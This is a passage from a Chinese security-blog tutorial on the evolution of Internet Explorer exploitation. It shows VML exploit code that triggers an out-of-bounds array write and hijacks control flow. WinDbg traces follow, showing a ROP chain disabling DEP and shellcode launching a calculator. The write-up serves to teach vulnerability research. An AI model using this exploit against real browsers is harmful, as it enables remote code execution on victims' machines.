&lt;xml:namespace&nbsp;ns=&quot;urn:schemas-microsoft-com:vml&quot;&nbsp;prefix=&quot;v&quot;&nbsp;/&gt;
&lt;script&gt;
var&nbsp;rect_array&nbsp;=&nbsp;new&nbsp;Array()
var&nbsp;a&nbsp;=&nbsp;new&nbsp;Array()
function&nbsp;createRects(){
for(var&nbsp;i=0;&nbsp;i&lt;0x1000;&nbsp;i++){
rect_array[i]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;document.createElement(&quot;v:shape&quot;)
rect_array[i].id&nbsp;=&nbsp;&quot;rect&quot;&nbsp;+&nbsp;i.toString()
document.body.appendChild(rect_array[i])
}
}
function&nbsp;exploit(){
var&nbsp;vml1&nbsp;=&nbsp;document.getElementById(&quot;vml1&quot;)
for&nbsp;(var&nbsp;i=0;&nbsp;i&lt;0x1000;&nbsp;i++){
a[i]&nbsp;=&nbsp;document.getElementById(&quot;rect&quot;&nbsp;+&nbsp;i.toString())._anchorRect;
if&nbsp;(i&nbsp;==&nbsp;0x800)&nbsp;{
vml1.dashstyle&nbsp;=&nbsp;&quot;1&nbsp;2&nbsp;3&nbsp;4&quot;
}
}
vml1.dashstyle.array.length&nbsp;=&nbsp;0&nbsp;-&nbsp;1;
vml1.dashstyle.array.item(6)&nbsp;=&nbsp;0x0c0c0c0c;
for&nbsp;(var&nbsp;i=0;&nbsp;i&lt;0x1000;&nbsp;i++)
{
delete&nbsp;a[i];
CollectGarbage();
}
location.reload();
}
&lt;/script&gt;
&lt;body&nbsp;onload=&quot;createRects();&nbsp;exploit();&quot;&gt;
&lt;v:oval&gt;
&lt;v:stroke&nbsp;id=&quot;vml1&quot;/&gt;
&lt;/v:oval&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">rop链的调试过程如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:014&gt;&nbsp;ba&nbsp;r4&nbsp;0c0c0c14
0:014&gt;&nbsp;g
Breakpoint&nbsp;0&nbsp;hit
eax=0c0c0c0c&nbsp;ebx=1264d864&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775b5789&nbsp;esp=0243b1b4&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!RtlAddSIDToBoundaryDescriptor+0x3b1:
775b5789&nbsp;94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;&nbsp;&nbsp;eax,esp
0:005&gt;&nbsp;p
eax=0243b1b4&nbsp;ebx=1264d864&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775b578a&nbsp;esp=0c0c0c0c&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
775b578a&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:005&gt;&nbsp;p
eax=0243b1b4&nbsp;ebx=1264d864&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775b578a&nbsp;esp=0c0c0c10&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
775b578a&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:005&gt;&nbsp;p
eax=0243b1b4&nbsp;ebx=1264d864&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775a96c9&nbsp;esp=0c0c0c14&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!RtlLockMemoryBlockLookaside+0x88:
775a96c9&nbsp;5b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx
0:005&gt;&nbsp;p
Breakpoint&nbsp;0&nbsp;hit
eax=0243b1b4&nbsp;ebx=775b5789&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775a96ca&nbsp;esp=0c0c0c18&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!RtlLockMemoryBlockLookaside+0x89:
775a96ca&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:005&gt;&nbsp;p
eax=0243b1b4&nbsp;ebx=775b5789&nbsp;ecx=12dadc20&nbsp;edx=000009e6&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=775e5f18&nbsp;esp=0c0c0c1c&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ntdll!ZwProtectVirtualMemory:
775e5f18&nbsp;b8d7000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,0D7h
可以看到rop链如我们预期的那样运行着．我们再在&nbsp;0c0c0c40处下断点，应为这里时shellcode的起始地址，我们看看DEP是否关闭成功：
0:005&gt;&nbsp;bp&nbsp;0c0c0c40
0:005&gt;&nbsp;g
Breakpoint&nbsp;1&nbsp;hit
eax=c0000045&nbsp;ebx=775b5789&nbsp;ecx=0c0c0c18&nbsp;edx=775e70b4&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=0c0c0c40&nbsp;esp=0c0c0c34&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
0c0c0c40&nbsp;fc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cld
0:005&gt;&nbsp;p
eax=c0000045&nbsp;ebx=775b5789&nbsp;ecx=0c0c0c18&nbsp;edx=775e70b4&nbsp;esi=1264d878&nbsp;edi=1264d860
eip=0c0c0c41&nbsp;esp=0c0c0c34&nbsp;ebp=0243b1f0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
0c0c0c41&nbsp;e889000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;0c0c0ccf</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到是成功的，我们已经能执行堆中的数据了^__^ ,此时按下g 我们的计算器就弹出来了．</span></p><p style="text-indent: 2em; text-align: center;"><img src="http://p5.qhimg.com/t018397fd7c1f53c88c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这样，这个漏洞的漏洞利用就被我们分段</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">的完成了，我们回过头来看看整个漏洞利用过程。首先我们通过数组越界修改对象的属性值地址，读到了一个值，通过这个值计算出了ntdll模块的基地址，并通过该基地址构造出rop链，之后又再次触发了漏洞，修改对象虚表指针，劫持程序执行流，完成了整个漏洞利用。这其中的每一步都是那么精妙，可以说只要稍微有点偏差，整个漏洞利用就会失败。可以说这样的漏洞利用真正的可以配得上＂优雅＂这个词语了。整个漏洞利用的一个连贯过程，metasploit上实现的非常棒，我们来看看效果。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p2.qhimg.com/t013ed8239e79d15d9d.png" title="t01d3c29683ab307031.png" alt="http://p3.qhimg.com/t01d3c29683ab307031.png"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到metasploit把漏洞利用玩的像一件艺术品一样，厉害！</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong><br/></strong></span></p><p style="white-space: normal; text-indent: 2em;"><font face="微软雅黑, Microsoft YaHei"><span style="font-size: 18px;"><b>传送门</b></span></font></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;">&nbsp;<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">【技术分享】 IE浏览器漏洞利用技术的演变 ( 一）&nbsp;</span><a href="http://bobao.360.cn/learning/detail/3021.html" _src="http://bobao.360.cn/learning/detail/3021.html" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">http://bobao.360.cn/learning/detail/3021.html</a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3029.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value=" 【技术分享】 ​IE浏览器漏洞利用技术的演变 ( 二 ) - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3029" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/1x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2676915949" class="response" data-bind-id="2676915949" data-target="4272" user-name="Ox9A82" href="javascript:;">
                Ox9A82            </a>
                        <span class="comment-time">2016-09-22 14:24:08</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2676915949" data-target="4272">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4272" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">确定是原创的？我怎么看到了鲜果那篇文章的影子</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/3x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4243" user-name="360" href="javascript:;">
                360            </a>
                        <span class="comment-time">2016-09-19 18:05:17</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4243">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4243" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">收藏夹
        本地用户和组(本地)
        文件夹
        控制台根节点</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/3x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4242" user-name="360" href="javascript:;">
                360            </a>
                        <span class="comment-time">2016-09-19 17:59:45</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4242">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4242" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">代码：

  {2C82BFAE-C288-46D7-8842-3B931CA08002}</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3029" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
